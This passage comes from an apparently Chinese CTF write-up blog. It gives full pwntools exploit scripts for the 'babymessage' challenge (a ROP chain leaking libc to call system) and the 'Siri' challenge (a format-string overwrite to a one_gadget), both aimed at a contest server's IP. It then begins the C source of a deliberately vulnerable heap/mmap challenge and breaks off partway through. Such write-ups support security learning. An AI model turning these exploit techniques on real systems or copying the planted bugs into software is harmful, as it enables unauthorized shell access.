I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;babymessage&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;123.56.170.202&quot;</span></span><br><span class="line">remotePort = <span class="number">21342</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	leak_fun = <span class="string">&#x27;puts&#x27;</span></span><br><span class="line">	dp_fun = <span class="string">&#x27;puts&#x27;</span></span><br><span class="line">	pop_rdi = <span class="number">0x400ac3</span></span><br><span class="line">	start = <span class="number">0x4006e0</span></span><br><span class="line">	offset = <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, p32(<span class="number">0x101</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x6010d0</span> + <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(exe.got[leak_fun])</span><br><span class="line">	p += p64(exe.plt[dp_fun])</span><br><span class="line">	p += p64(start)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(p)</span><br><span class="line"></span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	libc_base = leak - lib.sym[leak_fun]</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	libc_sys = libc_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	libc_sh = libc_base + <span class="number">0x00000000001b40fa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, p32(<span class="number">0x101</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x6010d0</span> + <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x400809</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(libc_sh)</span><br><span class="line">	p += p64(libc_sys)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="siri"><a href="#siri" class="headerlink" title="siri"></a>siri</h2><p>格式化字符串漏洞, 泄漏elf_base和libc_base, got表不能修改, 只能先泄漏stack地址, 修改ret地址打one_gadget了,  (已经可以修改ret地址了, 打one_gagdgt 打通了, 不知啥原因, execve函数会跳转到read函数, 导致输入token会出错, 原因: io已经处于shutdown状态)</p>
<p>另一种劫持,劫持libc中的got表地址, puts函数中存在plt跳转,修改该跳转函数的got地址为one_gadget即可. </p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;Siri&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;123.56.170.202&quot;</span></span><br><span class="line">remotePort = <span class="number">12124</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	sl(<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;Remind me to &#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;%1$p, %83$p, %85$p&#x27;</span></span><br><span class="line"></span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	elf_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - (<span class="number">0x55dde8275033</span> - <span class="number">0x55dde8273000</span>)</span><br><span class="line">	li(<span class="string">&#x27;elf_base &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - lib.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">231</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	target_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - (<span class="number">0x7fffb9b2b008</span> - <span class="number">0x7fffb9b2af38</span>) - <span class="number">0x10</span></span><br><span class="line">	target_addr = libc_base + (<span class="number">0x7f667e8880a8</span> - <span class="number">0x7f667e49d000</span>)</span><br><span class="line">	li(<span class="string">&#x27;target_addr &#x27;</span> + <span class="built_in">hex</span>(target_addr))</span><br><span class="line">	</span><br><span class="line">	gadget = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>, <span class="number">0xe58b8</span>, <span class="number">0xe58bf</span>, <span class="number">0xe58c3</span>, <span class="number">0x10a468</span>]</span><br><span class="line">	one_gadget = libc_base + gadget[<span class="number">5</span>]</span><br><span class="line">	<span class="comment">#one_gadget = libc_base + lib.sym[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line">	l_addr = one_gadget &amp; <span class="number">0xFFFF</span></span><br><span class="line">	h_addr = (one_gadget &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;l_addr &#x27;</span> + <span class="built_in">hex</span>(l_addr))</span><br><span class="line">	li(<span class="string">&#x27;h_addr &#x27;</span> + <span class="built_in">hex</span>(h_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sl(<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">	offset = <span class="number">14</span> + <span class="number">30</span> + <span class="number">5</span></span><br><span class="line">	pre_len = <span class="built_in">len</span>(<span class="string">&quot;OK, I&#x27;ll remind you to &quot;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;Remind me to &#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;AAA&#x27;</span> <span class="comment"># ajust</span></span><br><span class="line">	p2 = <span class="string">&#x27;%&#x27;</span>  + <span class="built_in">str</span>(h_addr - pre_len - <span class="number">7</span>)  + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">4</span>) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">	p2 += <span class="string">&#x27;%&#x27;</span>  + <span class="built_in">str</span>(l_addr - h_addr)  + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">5</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">len</span>(p2) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">len</span>(p2) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">			p2 += <span class="string">&#x27;A&#x27;</span></span><br><span class="line">	p += p2</span><br><span class="line">	p += p64(target_addr + <span class="number">2</span>)</span><br><span class="line">	p += p64(target_addr)</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;off &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(p2) / <span class="number">8</span>))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(p)</span><br><span class="line">	li(<span class="string">&#x27;one_gadget &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">	<span class="comment">#p = target_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="3-oldschool"><a href="#3-oldschool" class="headerlink" title="3-oldschool"></a>3-oldschool</h2><p>题目给了源码和libc, 需要自己编译, 源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 18.04, GCC -m32 -O3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_LOW    0xe0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_HIGH   0xf0000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* chunks[NUM];</span><br><span class="line"><span class="keyword">unsigned</span> sizes[NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>* g_ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">get_int</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> res;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;res) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_ptr != <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    munmap(g_ptr, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    g_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_ptr != <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where do you want to start: &quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    idx = get_int(); </span><br><span class="line"></span><br><span class="line">    idx = (idx &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= (ADDR_HIGH - ADDR_LOW) ) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(g_ptr != (ADDR_LOW + idx))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_ptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Mmap first!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123; <span class="comment">// vul</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    value = get_int(); </span><br><span class="line">    g_ptr[idx] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx])&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    size = get_int() &amp; <span class="number">0x1FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chunks[idx] = buf;</span><br><span class="line">    sizes[idx] = size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(chunks[idx]);</span><br><span class="line">    chunks[idx] = <span class="literal">NULL</span>;</span><br><span class="line">    sizes[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span 